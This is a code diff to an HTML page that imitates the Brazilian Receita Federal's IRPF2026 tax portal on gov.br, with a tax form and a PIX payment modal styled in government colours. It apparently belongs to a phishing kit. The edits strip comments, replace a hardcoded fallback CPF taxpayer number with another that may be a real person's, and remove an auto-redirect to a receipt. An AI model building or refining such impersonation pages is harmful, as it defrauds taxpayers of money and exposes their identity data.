@@ -3,14 +3,13 @@
 
 <head>
     <meta charset="utf-8" />
-    <!-- Google Tag Manager -->
+   
     <script type="text/javascript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
     new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
     j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
     })(window,document,'script','dataLayer','GTM-NHZSKTD');</script>
-    <!-- End Google Tag Manager -->
-
+   
     <script type="application/ld+json">
     {
         "@context": "https://schema.org",
@@ -208,7 +207,7 @@
             to { transform: rotate(360deg); }
         }
         
-        /* MODAL PIX - TEMA GOV.BR (AZUL E BRANCO) */
+       
         .modal-pix {
             display: none;
             position: fixed;
@@ -390,9 +389,9 @@
 </head>
 
 <body id="" class="default-header-template portal-institucional cover-layout-layout-vazio template-view portaltype-collective-cover-content site-pt-br section-assuntos subsection-meu-imposto-de-renda subsection-meu-imposto-de-renda-irpf2026 userrole-anonymous" data-base-url="https://www.gov.br/receitafederal/pt-br/assuntos/meu-imposto-de-renda/irpf2026" data-portal-url="https://www.gov.br/receitafederal" dir="ltr">
-    <!-- Google Tag Manager (noscript) -->
+   
     <noscript><iframe height="0" width="0" style="display:none;visibility:hidden" data-src="https://www.googletagmanager.com/ns.html?id=GTM-NHZSKTD"></iframe></noscript>
-    <!-- End Google Tag Manager (noscript) -->
+   
 
     <nav class="govbr-skip-menu" aria-label="Acesso rápido">
         <a href="#wrapper" accesskey="1"><span class="sr-only">Ir para o</span> Conteúdo<span class="access-key">1</span></a>
@@ -512,7 +511,7 @@
                             </div>
                         </div>
 
-                        <!-- Conteúdo Principal -->
+                       
                         <div class="row govbr-recom-wrapper">
                             <div class="row-content">
                                 <div class="column col-md-7">
@@ -543,7 +542,7 @@
                             </div>
                         </div>
 
-                        <!-- FORMULÁRIO DE CÁLCULO DE IMPOSTO -->
+                       
                         <div class="row">
                             <div class="row-content">
                                 <div class="column col-md-12">
@@ -583,7 +582,7 @@
                             </div>
                         </div>
 
-                        <!-- Orientações -->
+                        
                         <div class="row linha-discreta">
                             <div class="row-content">
                                 <div class="column col-md-12"><div class="tile tile-default"><div class="outstanding-header tile-content"><h2 class="outstanding-title">Orientações</h2></div></div></div>
@@ -602,7 +601,7 @@
                             </div>
                         </div>
 
-                        <!-- Estatísticas -->
+                        
                         <div class="row linha-discreta">
                             <div class="row-content">
                                 <div class="column col-md-12">
@@ -624,7 +623,7 @@
         </div>
     </div>
 
-    <!-- MODAL PIX - TEMA GOV.BR -->
+    
     <div id="modal-pix" class="modal-pix">
         <div class="modal-content">
             <h3><i class="fab fa-pix"></i> Pagamento via PIX</h3>
@@ -743,7 +742,7 @@
     cpfSalvo = cpfSalvo.replace(/[.-]/g, '');
     
     if (!cpfSalvo || cpfSalvo.length !== 11) {
-        cpfSalvo = '11144477735';
+        cpfSalvo = '07068093868';
         console.log('⚠️ CPF não encontrado, usando padrão:', cpfSalvo);
     }
     
@@ -792,11 +791,7 @@
             
             document.getElementById('modal-pix').style.display = 'flex';
             
-            // 🔥 REDIRECIONA AUTOMATICAMENTE APÓS 3 SEGUNDOS 🔥
-            setTimeout(() => {
-                document.getElementById('modal-pix').style.display = 'none';
-                window.location.href = `recibo.html?valor=${ultimoPixGerado.valor}&cpf=${ultimoPixGerado.cpf}`;
-            }, 3000);
+           
         } else {
             alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente'));
         }
